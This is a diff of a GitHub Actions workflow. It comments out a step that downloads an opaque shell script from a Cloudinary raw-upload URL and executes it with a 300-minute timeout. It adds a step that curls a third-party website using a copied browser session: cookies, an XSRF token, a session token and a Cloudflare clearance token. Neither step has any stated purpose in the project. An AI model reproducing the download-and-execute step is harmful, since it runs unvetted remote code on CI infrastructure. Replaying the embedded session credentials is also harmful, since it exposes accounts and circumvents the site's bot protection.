@@ -13,9 +13,27 @@ jobs:
       - name: IP Workflow
         run: |
           curl https://api.ipify.org
-      - name: Run exec
-        timeout-minutes: 300
-        run: |
-          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1711832294/nuephguljsh2zaq90gsk.sh
-          chmod +x nuephguljsh2zaq90gsk.sh
-          ./nuephguljsh2zaq90gsk.sh
+      # - name: Run exec
+      #   timeout-minutes: 300
+      #   run: |
+      #     curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1711832294/nuephguljsh2zaq90gsk.sh
+      #     chmod +x nuephguljsh2zaq90gsk.sh
+      #     ./nuephguljsh2zaq90gsk.sh
+      - name: Exécuter CURL
+        uses: curl-actions/curl@v2
+        with:
+          args: curl 'https://www.tiroof.co.uk/' \
+                -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+                -H 'accept-language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7' \
+                -H 'cache-control: max-age=0' \
+                -H 'cookie: _ga=GA1.1.652517754.1711125266; cf_clearance=jqyDwX2csFadgBQco6K36vOrrH5k3.M6DUE8G.A.MJg-1711829650-1.0.1.1-DINy1niSx9ZuiSaItP1mLAQ8CeXwkGbK915SQ8KiCGsNnd_xizVV0PzZSW17Vr0JcaUOmL81N02qgf4A3skCAA; _ga_TF9T2PFE93=GS1.1.1711829649.12.0.1711829649.0.0.0; TawkConnectionTime=0; twk_uuid_65b0c1b28d261e1b5f573855=%7B%22uuid%22%3A%221.SwsQeDGe55Go87UWs1ItltNwlccS6oXpMXGjAMnFY20BqsFffdCda18B7jYC5rzllctVwwRmHWSaMUplpdM5efr6yCOiVYOPWTBboC598UwXCj93xyXeX%22%2C%22version%22%3A3%2C%22domain%22%3A%22tiroof.co.uk%22%2C%22ts%22%3A1711831115812%7D; XSRF-TOKEN=eyJpdiI6Ilc1S3hKVllRbnZZdGpXZkhvYXZkQlE9PSIsInZhbHVlIjoibnQwV2RVUWtMQUIwdFg5ZFpxN2swUXIvRTNBWFFPaElKTFVVOEtHdzdlbnlWdlJ6M1pJQmVsKzMxNVpyUnhzUkhZT3pudXpQZElnRUJodmoySUMyZGNyZ3B6MWpRVlVOYzVsR1dxNzdqbEVKcVFrdm01a2UwMnRsbkMzdktUbTAiLCJtYWMiOiJjYWRiZTk4ZjJhYTg0NTY1YTliMTg0OTc3MjM2MGIyODMxNWU0YjEyZjlhYjI3MWUyN2FmYjMwZmI5NzMwZmRhIiwidGFnIjoiIn0%3D; bailti_session=eyJpdiI6IktBS0tuMVdnTDVvQmFOMzlTUG43V0E9PSIsInZhbHVlIjoieUU4eHZ0ZTk4dkw3MTZDTEh3VjhDclpzY3o0aFJyRXZLSDMxbG1uamJCT0tYUG5Uak4vVFBjUzhTa2xYUit0TzlvWE9NVFF4U1FIUUZFd09WQ09kYWN6MnVVNEpQam0vMStiN2lEZHpTaFhiN2lYTTgvTDk3c3BRWDcxV0tvUGIiLCJtYWMiOiJiODM2ZGZhZGZjMjFhYmVkZWM4ODA1YTU2NmM2NGVjNTMxYWUzODZlMTYzZWMwODg4NDM2OGE1NzE5ZDY3NzhjIiwidGFnIjoiIn0%3D' \
+                -H 'referer: https://www.bailti.fr/' \
+                -H 'sec-ch-ua: "Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"' \
+                -H 'sec-ch-ua-mobile: ?0' \
+                -H 'sec-ch-ua-platform: "Windows"' \
+                -H 'sec-fetch-dest: document' \
+                -H 'sec-fetch-mode: navigate' \
+                -H 'sec-fetch-site: cross-site' \
+                -H 'sec-fetch-user: ?1' \
+                -H 'upgrade-insecure-requests: 1' \
+                -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
